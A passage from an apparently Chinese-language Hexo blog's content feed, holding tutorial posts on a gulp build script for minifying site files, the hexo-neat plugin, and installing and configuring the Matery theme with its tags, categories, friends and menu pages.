punctuation">,</span>对合并的文件进行压缩        <span class="token punctuation">.</span><span class="token function">pipe</span><span class="token punctuation">(</span>gulp<span class="token punctuation">.</span><span class="token function">dest</span><span class="token punctuation">(</span><span class="token string">"./public"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token operator">/</span><span class="token operator">/</span>输出到目标目录    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token operator">/</span><span class="token operator">/</span> 压缩<span class="token keyword">public</span>目录下的css文件    gulp<span class="token punctuation">.</span><span class="token function">task</span><span class="token punctuation">(</span><span class="token string">"compressCss"</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">var</span> option <span class="token operator">=</span> <span class="token punctuation">{</span>        rebase<span class="token punctuation">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>        <span class="token operator">/</span><span class="token operator">/</span>advanced<span class="token punctuation">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span> <span class="token operator">/</span><span class="token operator">/</span>类型：Boolean 默认：<span class="token boolean">true</span> <span class="token punctuation">[</span>是否开启高级优化（合并选择器等）<span class="token punctuation">]</span>        compatibility<span class="token punctuation">:</span> <span class="token string">"ie7"</span> <span class="token operator">/</span><span class="token operator">/</span>保留ie7及以下兼容写法 类型：String 默认：<span class="token string">''</span>or<span class="token string">'*'</span> <span class="token punctuation">[</span>启用兼容模式； <span class="token string">'ie7'</span>：IE7兼容模式，<span class="token string">'ie8'</span>：IE8兼容模式，<span class="token string">'*'</span>：IE9<span class="token operator">+</span>兼容模式<span class="token punctuation">]</span>        <span class="token operator">/</span><span class="token operator">/</span>keepBreaks<span class="token punctuation">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span> <span class="token operator">/</span><span class="token operator">/</span>类型：Boolean 默认：<span class="token boolean">false</span> <span class="token punctuation">[</span>是否保留换行<span class="token punctuation">]</span>        <span class="token operator">/</span><span class="token operator">/</span>keepSpecialComments<span class="token punctuation">:</span> <span class="token string">'*'</span> <span class="token operator">/</span><span class="token operator">/</span>保留所有特殊前缀 当你用autoprefixer生成的浏览器前缀，如果不加这个参数，有可能将会删除你的部分前缀    <span class="token punctuation">}</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> gulp        <span class="token punctuation">.</span><span class="token function">src</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">"./public/**/*.css"</span><span class="token punctuation">,</span> <span class="token string">"!./public/**/*.min.css"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//排除的css</span>        <span class="token punctuation">.</span><span class="token function">pipe</span><span class="token punctuation">(</span><span class="token function">gulpif</span><span class="token punctuation">(</span><span class="token operator">!</span>isScriptAll<span class="token punctuation">,</span> <span class="token function">changed</span><span class="token punctuation">(</span><span class="token string">"./public"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token punctuation">.</span><span class="token function">pipe</span><span class="token punctuation">(</span><span class="token function">gulpif</span><span class="token punctuation">(</span>isDebug<span class="token punctuation">,</span> <span class="token function">debug</span><span class="token punctuation">(</span><span class="token punctuation">{</span> title<span class="token punctuation">:</span> <span class="token string">"Compress CSS:"</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token punctuation">.</span><span class="token function">pipe</span><span class="token punctuation">(</span><span class="token function">plumber</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token punctuation">.</span><span class="token function">pipe</span><span class="token punctuation">(</span><span class="token function">cleancss</span><span class="token punctuation">(</span>option<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token punctuation">.</span><span class="token function">pipe</span><span class="token punctuation">(</span>gulp<span class="token punctuation">.</span><span class="token function">dest</span><span class="token punctuation">(</span><span class="token string">"./public"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// 压缩public目录下的html文件</span>    gulp<span class="token punctuation">.</span><span class="token function">task</span><span class="token punctuation">(</span><span class="token string">"compressHtml"</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">var</span> cleanOptions <span class="token operator">=</span> <span class="token punctuation">{</span>        protect<span class="token punctuation">:</span> <span class="token regex">/&lt;\!--%fooTemplate\b.*?%-->/g</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">//忽略处理</span>        unprotect<span class="token punctuation">:</span> <span class="token operator">/</span><span class="token operator">&lt;</span>script <span class="token punctuation">[</span><span class="token operator">^</span><span class="token operator">></span><span class="token punctuation">]</span><span class="token operator">*</span>\btype<span class="token operator">=</span><span class="token string">"text\/x-handlebars-template"</span><span class="token punctuation">[</span>\s\S<span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">?</span><span class="token operator">&lt;</span>\<span class="token operator">/</span>script<span class="token operator">></span><span class="token operator">/</span>gi <span class="token comment" spellcheck="true">//特殊处理</span>    <span class="token punctuation">}</span><span class="token punctuation">;</span>    <span class="token keyword">var</span> minOption <span class="token operator">=</span> <span class="token punctuation">{</span>        collapseWhitespace<span class="token punctuation">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">//压缩HTML</span>        collapseBooleanAttributes<span class="token punctuation">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">//省略布尔属性的值 &lt;input checked="true"/> ==> &lt;input /></span>        removeEmptyAttributes<span class="token punctuation">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">//删除所有空格作属性值 &lt;input id="" /> ==> &lt;input /></span>        removeScriptTypeAttributes<span class="token punctuation">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">//删除&lt;scripts>的type="text/javascript"</span>        removeStyleLinkTypeAttributes<span class="token punctuation">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">//删除&lt;style>和&lt;link>的type="text/css"</span>        removeComments<span class="token punctuation">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">//清除HTML注释</span>        minifyJS<span class="token punctuation">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">//压缩页面JS</span>        minifyCSS<span class="token punctuation">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">//压缩页面CSS</span>        minifyURLs<span class="token punctuation">:</span> <span class="token boolean">true</span> <span class="token comment" spellcheck="true">//替换页面URL</span>    <span class="token punctuation">}</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> gulp        <span class="token punctuation">.</span><span class="token function">src</span><span class="token punctuation">(</span><span class="token string">"./public/**/*.html"</span><span class="token punctuation">)</span>        <span class="token punctuation">.</span><span class="token function">pipe</span><span class="token punctuation">(</span><span class="token function">gulpif</span><span class="token punctuation">(</span>isDebug<span class="token punctuation">,</span> <span class="token function">debug</span><span class="token punctuation">(</span><span class="token punctuation">{</span> title<span class="token punctuation">:</span> <span class="token string">"Compress HTML:"</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token punctuation">.</span><span class="token function">pipe</span><span class="token punctuation">(</span><span class="token function">plumber</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token punctuation">.</span><span class="token function">pipe</span><span class="token punctuation">(</span><span class="token function">htmlclean</span><span class="token punctuation">(</span>cleanOptions<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token punctuation">.</span><span class="token function">pipe</span><span class="token punctuation">(</span><span class="token function">htmlmin</span><span class="token punctuation">(</span>minOption<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token punctuation">.</span><span class="token function">pipe</span><span class="token punctuation">(</span>gulp<span class="token punctuation">.</span><span class="token function">dest</span><span class="token punctuation">(</span><span class="token string">"./public"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// 压缩 public/medias 目录内图片</span>    gulp<span class="token punctuation">.</span><span class="token function">task</span><span class="token punctuation">(</span><span class="token string">"compressImage"</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">var</span> option <span class="token operator">=</span> <span class="token punctuation">{</span>        optimizationLevel<span class="token punctuation">:</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">//类型：Number 默认：3 取值范围：0-7（优化等级）</span>        progressive<span class="token punctuation">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">//类型：Boolean 默认：false 无损压缩jpg图片</span>        interlaced<span class="token punctuation">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">//类型：Boolean 默认：false 隔行扫描gif进行渲染</span>        multipass<span class="token punctuation">:</span> <span class="token boolean">false</span> <span class="token comment" spellcheck="true">//类型：Boolean 默认：false 多次优化svg直到完全优化</span>    <span class="token punctuation">}</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> gulp        <span class="token punctuation">.</span><span class="token function">src</span><span class="token punctuation">(</span><span class="token string">"./public/medias/**/*.*"</span><span class="token punctuation">)</span>        <span class="token punctuation">.</span><span class="token function">pipe</span><span class="token punctuation">(</span><span class="token function">gulpif</span><span class="token punctuation">(</span><span class="token operator">!</span>isScriptAll<span class="token punctuation">,</span> <span class="token function">changed</span><span class="token punctuation">(</span><span class="token string">"./public/medias"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token punctuation">.</span><span class="token function">pipe</span><span class="token punctuation">(</span><span class="token function">gulpif</span><span class="token punctuation">(</span>isDebug<span class="token punctuation">,</span> <span class="token function">debug</span><span class="token punctuation">(</span><span class="token punctuation">{</span> title<span class="token punctuation">:</span> <span class="token string">"Compress Images:"</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token punctuation">.</span><span class="token function">pipe</span><span class="token punctuation">(</span><span class="token function">plumber</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token punctuation">.</span><span class="token function">pipe</span><span class="token punctuation">(</span><span class="token function">imagemin</span><span class="token punctuation">(</span>option<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token punctuation">.</span><span class="token function">pipe</span><span class="token punctuation">(</span>gulp<span class="token punctuation">.</span><span class="token function">dest</span><span class="token punctuation">(</span><span class="token string">"./public"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// 执行顺序： 清除public目录 -> 产生原始博客内容 -> 执行压缩混淆 -> 部署到服务器</span>    gulp<span class="token punctuation">.</span><span class="token function">task</span><span class="token punctuation">(</span>        <span class="token string">"build"</span><span class="token punctuation">,</span>        gulp<span class="token punctuation">.</span><span class="token function">series</span><span class="token punctuation">(</span>            <span class="token string">"clean"</span><span class="token punctuation">,</span>            <span class="token string">"generate"</span><span class="token punctuation">,</span>            <span class="token string">"compressHtml"</span><span class="token punctuation">,</span>            <span class="token string">"compressCss"</span><span class="token punctuation">,</span>            <span class="token string">"compressJs"</span><span class="token punctuation">,</span>            <span class="token string">"compressImage"</span><span class="token punctuation">,</span>            gulp<span class="token punctuation">.</span><span class="token function">parallel</span><span class="token punctuation">(</span><span class="token string">"deploy"</span><span class="token punctuation">)</span>        <span class="token punctuation">)</span>    <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// 默认任务</span>    gulp<span class="token punctuation">.</span><span class="token function">task</span><span class="token punctuation">(</span>        <span class="token string">"default"</span><span class="token punctuation">,</span>        gulp<span class="token punctuation">.</span><span class="token function">series</span><span class="token punctuation">(</span>            <span class="token string">"clean"</span><span class="token punctuation">,</span>            <span class="token string">"generate"</span><span class="token punctuation">,</span>            gulp<span class="token punctuation">.</span><span class="token function">parallel</span><span class="token punctuation">(</span><span class="token string">"compressHtml"</span><span class="token punctuation">,</span> <span class="token string">"compressCss"</span><span class="token punctuation">,</span> <span class="token string">"compressJs"</span><span class="token punctuation">,</span><span class="token string">"compressImage"</span><span class="token punctuation">)</span>        <span class="token punctuation">)</span>    <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//Gulp4最大的一个改变就是gulp.task函数现在只支持两个参数，分别是任务名和运行任务的函数</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="hexo-neat插件实现代码压缩"><a href="#hexo-neat插件实现代码压缩" class="headerlink" title="hexo-neat插件实现代码压缩"></a>hexo-neat插件实现代码压缩</h3><p><a href="https://github.com/rozbo/hexo-neat" target="_blank" rel="noopener">hexo-neat</a>插件也是用来压缩代码的，底层也是通过gulp来实现的。但是这个插件是有Bug的。</p><p>压缩 md 文件会使 markdown 语法的代码块消失</p><p>会删除全角空格</p><p>在博客站点根目录执行安装代码：</p><hr><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">npm</span> <span class="token function">install</span> hexo-neat --save<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>紧接着在站点根目录下的配置文件(_config.yml)添加如下代码：</p><hr><pre class="line-numbers language-yml"><code class="language-yml">neat_enable: trueneat_html:  enable: true  exclude:neat_css:  enable: true  exclude:    - '*.min.css'neat_js:  enable: true  mangle: true  output:  compress:  exclude:    - '*.min.js'<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后直接</p><hr><pre class="line-numbers language-bash"><code class="language-bash">hexo cl<span class="token operator">&amp;&amp;</span>hexo g <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>就可以了，会自动压缩文件 。</p><p>补充：</p><p>解决以上Bug，需要将以上默认配置修改为：</p><hr><pre class="line-numbers language-yml"><code class="language-yml">#hexo-neat 优化提速插件（去掉HTML、css、js的blank字符）neat_enable: trueneat_html:  enable: true  exclude:    - '**/*.md'neat_css:  enable: true  exclude:    - '**/*.min.css'neat_js:  enable: true  mangle: true  output:  compress:  exclude:    - '**/*.min.js'    - '**/**/instantpage.js'    - '**/matery.js'<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> hexo Matery </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hexo Matery </tag>
            
            <tag> hexo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hexo博客主题安装以及优化（一）</title>
      <link href="/2021/01/16/16/"/>
      <url>/2021/01/16/16/</url>
      
        <content type="html"><![CDATA[<p>因为默认的主题不好看所以你可以在github上搜索 hexo-theme 来得到更多主题，这里以  Matery 主题为例</p><p>简单漂亮，文章内容美观易读</p><p>Material Design 设计</p><p>响应式设计，博客在桌面端、平板、手机等设备上均能很好的展现</p><p>首页轮播文章及每天动态切换 Banner 图片</p><p>瀑布流式的博客文章列表（文章无特色图片时会有 24 张漂亮的</p><p>图片代替）</p><p>时间轴式的归档页</p><p>词云的标签页和雷达图的分类页</p><p>丰富的关于我页面（包括关于我、文章统计图、我的项目、我的</p><p>技能、相册等）</p><p>可自定义的数据的友情链接页面</p><p>支持文章置顶和文章打赏</p><p>支持 MathJax</p><p>TOC 目录</p><p>可设置复制文章内容时追加版权信息</p><p>可设置阅读文章时做密码验证</p><p>Gitalk、Gitment、Valine 和 Disqus 评论模块（推荐使用<br>Gitalk）</p><p>集成了不蒜子统计、谷歌分析（Google Analytics）和文章字<br>数统计等功能</p><p>支持在首页的音乐播放和视频播放功能</p><p>支持emoji表情，用markdown emoji语法书写直接生成对应的能跳跃的表情。</p><p>支持 DaoVoice、Tidio 在线聊天功能</p><h2 id="开始安装主题"><a href="#开始安装主题" class="headerlink" title="开始安装主题"></a>开始安装主题</h2><p>通过访问网站进入<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank" rel="noopener">主题仓库</a><br>克隆该仓库到blog目录下的 themes/hexo-theme-matery 文件夹(hexo-theme-matery 会自动新建)到你的博客目录右键打开Git bash输入</p><pre class="line-numbers language-bash"><code class="language-bash">    <span class="token function">git</span> clone https://github.com/blinkfox/hexo-theme-matery themes/hexo-theme-matery<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后进入 hexo 的配置文件（ _config.yml）找到 </p><pre class="line-numbers language-yml"><code class="language-yml">    #Extensions 并更改下面的主题设置 theme: hexo-theme-matery （记得加空格）<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>另外注意，配置文件中的标点符号不要出现中文格式的标点符号，不然运行会出错。其他主题安装也可使用本方法。语言选择：如果为中文用</p><pre class="line-numbers language-yml"><code class="language-yml">    则在language:后添加值zh-CN，如果不修改，默认为英语；    网址修改：url:的值为你的网址名，如https://xxxx.github.io或者https://xxxx.gitee.io，如果有域名，则修改为你的域名即可。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>至于有关域名的修改解析，后面我会说到。<br>站点配置文件有个per_page属性，建议修改为6的倍数，这样网站在适应设备时，有较好的显示效果。</p><p>保存退出后，清理缓存</p><pre class="line-numbers language-bash"><code class="language-bash">    hexo clean <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>再次生成</p><pre class="line-numbers language-bash"><code class="language-bash">    hexo generate/g <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>启动站点</p><pre class="line-numbers language-bash"><code class="language-bash">    hexo server/s<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>部署到远端</p><pre class="line-numbers language-bash"><code class="language-bash">    hexo deploy/d<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>完成主题安装</p><h1 id="主题优化"><a href="#主题优化" class="headerlink" title="主题优化"></a>主题优化</h1><p>到博客目录右键打开新的Git bash。或者在旧的Git bash输入</p><pre class="line-numbers language-bash"><code class="language-bash">    <span class="token function">clear</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>清理一下终端。</p><h2 id="新建标签-tags-页面"><a href="#新建标签-tags-页面" class="headerlink" title="新建标签 tags 页面"></a>新建标签 tags 页面</h2><p>tags 页是用来展示所有标签的页面，如果在你的博客 source 目录下还没有 tags/index.md 文件，那么你就需要新建一个，命令如下：</p><pre class="line-numbers language-bash"><code class="language-bash">    hexo new page <span class="token string">"tags"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>编辑你刚刚新建的页面文件 /source/tags/index.md，至少需要以下内容：</p><pre><code>    ---    title: tags    date: 2020-09-30 13:30:00    type: &quot;tags&quot;    layout: &quot;tags&quot;    ---</code></pre><h2 id="新建分类-categories-页面"><a href="#新建分类-categories-页面" class="headerlink" title="新建分类 categories 页面"></a>新建分类 categories 页面</h2><p>categories 页是用来展示所有分类的页面，如果在你的博客 source 目录下还没有 categories/index.md 文件，那么你就需要新建一个，命令如下：</p><pre class="line-numbers language-bash"><code class="language-bash">    hexo new page <span class="token string">"categories"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>同上编辑你刚刚新建的页面文件 /source/categories/index.md，至少需要以下内容：</p><pre><code>    ---    title: categories    date: 2020-09-30 13:30:00    type: &quot;categories&quot;    layout: &quot;categories&quot;    ---</code></pre><h2 id="新建关于我-about-页面"><a href="#新建关于我-about-页面" class="headerlink" title="新建关于我 about 页面"></a>新建关于我 about 页面</h2><pre class="line-numbers language-bash"><code class="language-bash">    hexo new page <span class="token string">"about"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>编辑你刚刚新建的页面文件 /source/about/index.md，至少需要以下内容：</p><pre><code>    ---    title: about    date: 2020-09-30 13:30:00    type: &quot;about&quot;    layout: &quot;about&quot;    ---</code></pre><h2 id="新建留言板-contact-页面-可选"><a href="#新建留言板-contact-页面-可选" class="headerlink" title="新建留言板 contact 页面 (可选)"></a>新建留言板 contact 页面 (可选)</h2><p>contact 页是用来展示留言板信息的页面，如果在你的博客 source 目录下还没有 contact/index.md 文件，那么你就需要新建一个，命令如下：</p><pre class="line-numbers language-bash"><code class="language-bash">    hexo new page <span class="token string">"contact"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>编辑你刚刚新建的页面文件 /source/contact/index.md，至少需要以下内容：</p><pre><code>    ---    title: contact    date: 2020-09-30 13:30:00    type: &quot;contact&quot;    layout: &quot;contact&quot;    ---</code></pre><p>注：本留言板功能依赖于第三方评论系统，请激活你的评论系统才有效果。并且在主题的 _config.yml 文件中，第 19 至 21 行的“菜单”配置，取消关于留言板的注释即可。（后面我也会写怎么添加评论系统）</p><h2 id="新建友情链接-friends-页面-可选"><a href="#新建友情链接-friends-页面-可选" class="headerlink" title="新建友情链接 friends 页面 (可选)"></a>新建友情链接 friends 页面 (可选)</h2><p>friends 页是用来展示友情链接信息的页面，如果在你的博客 source 目录下还没有 friends/index.md 文件，那么你就需要新建一个，命令如下:</p><pre class="line-numbers language-bash"><code class="language-bash">    hexo new page <span class="token string">"friends"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>编辑你刚刚新建的页面文件 /source/friends/index.md，至少需要以下内容：</p><pre><code>    ---    title: friends    date: 2020-09-30 13:30:00    type: &quot;friends&quot;    layout: &quot;friends&quot;    ---</code></pre><p>同时，在你的博客 source 目录下新建 _data 目录，在 _data 目录中新建 friends.json 文件，文件内容如下所示：</p><pre class="line-numbers language-json"><code class="language-json">    <span class="token punctuation">[</span><span class="token punctuation">{</span>    <span class="token property">"avatar"</span><span class="token operator">:</span> <span class="token string">"http://image.luokangyuan.com/1_qq_27922023.jpg"</span><span class="token punctuation">,</span>    <span class="token property">"name"</span><span class="token operator">:</span> <span class="token string">"码酱"</span><span class="token punctuation">,</span>    <span class="token property">"introduction"</span><span class="token operator">:</span> <span class="token string">"我不是大佬，只是在追寻大佬的脚步"</span><span class="token punctuation">,</span>    <span class="token property">"url"</span><span class="token operator">:</span> <span class="token string">"http://luokangyuan.com/"</span><span class="token punctuation">,</span>    <span class="token property">"title"</span><span class="token operator">:</span> <span class="token string">"前去学习"</span>    <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>    <span class="token property">"avatar"</span><span class="token operator">:</span> <span class="token string">"http://image.luokangyuan.com/4027734.jpeg"</span><span class="token punctuation">,</span>    <span class="token property">"name"</span><span class="token operator">:</span> <span class="token string">"闪烁之狐"</span><span class="token punctuation">,</span>    <span class="token property">"introduction"</span><span class="token operator">:</span> <span class="token string">"编程界大佬，技术牛，人还特别好，不懂的都可以请教大佬"</span><span class="token punctuation">,</span>    <span class="token property">"url"</span><span class="token operator">:</span> <span class="token string">"http://blinkfox.com/"</span><span class="token punctuation">,</span>    <span class="token property">"title"</span><span class="token operator">:</span> <span class="token string">"前去学习"</span>    <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>    <span class="token property">"avatar"</span><span class="token operator">:</span> <span class="token string">"http://image.luokangyuan.com/avatar.jpg"</span><span class="token punctuation">,</span>    <span class="token property">"name"</span><span class="token operator">:</span> <span class="token string">"ja_rome"</span><span class="token punctuation">,</span>    <span class="token property">"introduction"</span><span class="token operator">:</span> <span class="token string">"平凡的脚步也可以走出伟大的行程"</span><span class="token punctuation">,</span>    <span class="token property">"url"</span><span class="token operator">:</span> <span class="token string">"https://me.csdn.net/jlh912008548"</span><span class="token punctuation">,</span>    <span class="token property">"title"</span><span class="token operator">:</span> <span class="token string">"前去学习"</span>    <span class="token punctuation">}</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="菜单导航配置"><a href="#菜单导航配置" class="headerlink" title="菜单导航配置"></a>菜单导航配置</h2><h3 id="配置基本菜单导航的名称、路径url和图标icon"><a href="#配置基本菜单导航的名称、路径url和图标icon" class="headerlink" title="配置基本菜单导航的名称、路径url和图标icon"></a>配置基本菜单导航的名称、路径url和图标icon</h3><p>菜单导航名称可以是中文也可以是英文(如：Index或主页)</p><p>图标icon 可以在<a href="http://www.fontawesome.com.cn/icons-ui/" target="_blank" rel="noopener">Font Awesome</a> 中查找</p><pre class="line-numbers language-yml"><code class="language-yml">    menu:    Index:    url: /    icon: fas fa-home    Tags:    url: /tags    icon: fas fa-tags    Categories:    url: /categories    icon: fas fa-bookmark    Archives:    url: /archives    icon: fas fa-archive    About:    url: /about    icon: fas fa-user-circle    Friends:    url: /friends    icon: fas fa-address-book<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>当然啦，这些图标呢一开始都是默认的，你可以不用修改。</p><h3 id="二级菜单配置方法"><a href="#二级菜单配置方法" class="headerlink" title="二级菜单配置方法"></a>二级菜单配置方法</h3><p>如果你需要二级菜单则可以在原基本菜单导航的基础上如下操作。</p><p>在children下创建二级菜单的 名称name,路径url和图标icon。</p><p>注意每个二级菜单模块前要加 -</p><p>注意缩进格式</p><pre class="line-numbers language-yml"><code class="language-yml">    menu:      Index:        url: /        icon: fas fa-home      Tags:        url: /tags        icon: fas fa-tags      Categories:        url: /categories        icon: fas fa-bookmark      Archives:        url: /archives        icon: fas fa-archive      About:        url: /about        icon: fas fa-user-circle-o      Friends:        url: /friends        icon: fas fa-address-book      Medias:        icon: fas fa-list        children:          - name: Musics            url: /musics            icon: fas fa-music          - name: Movies            url: /movies            icon: fas fa-film          - name: Books            url: /books            icon: fas fa-book          - name: Galleries            url: /galleries            icon: fas fa-image<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="添加emoji表情支持（可选的）"><a href="#添加emoji表情支持（可选的）" class="headerlink" title="添加emoji表情支持（可选的）"></a>添加emoji表情支持（可选的）</h2><p>本主题新增了对emoji表情的支持，使用到了 <a href="https://github.com/crimx/hexo-filter-github-emojis/" target="_blank" rel="noopener">hexo-filter-github-emojis</a> 的 Hexo 插件来支持 emoji表情的生成，把对应的markdown emoji语法（::,例如：:smile:）转变成会跳跃的emoji表情，安装命令如下：</p><pre class="line-numbers language-bash"><code class="language-bash">    <span class="token function">npm</span> <span class="token function">install</span> hexo-filter-github-emojis --save<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在 Hexo 根目录下的 _config.yml 文件中，新增以下的配置项：</p><pre class="line-numbers language-yml"><code class="language-yml">    githubEmojis:      enable: true      className: github-emoji      inject: true      styles:      customEmojis:<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>执行 hexo clean &amp;&amp; hexo g 重新生成博客文件，然后就可以在文章中对应位置看到你用emoji语法写的表情了。</p><h2 id="代码高亮"><a href="#代码高亮" class="headerlink" title="代码高亮"></a>代码高亮</h2><p>由于 Hexo 自带的代码高亮主题显示不好看，所以主题中使用到了 <a href="https://github.com/ele828/hexo-prism-plugin" target="_blank" rel="noopener">hexo-prism-plugin</a> 的 Hexo 插件来做代码高亮，安装命令如下:</p><hr><pre class="line-numbers language-bash"><code 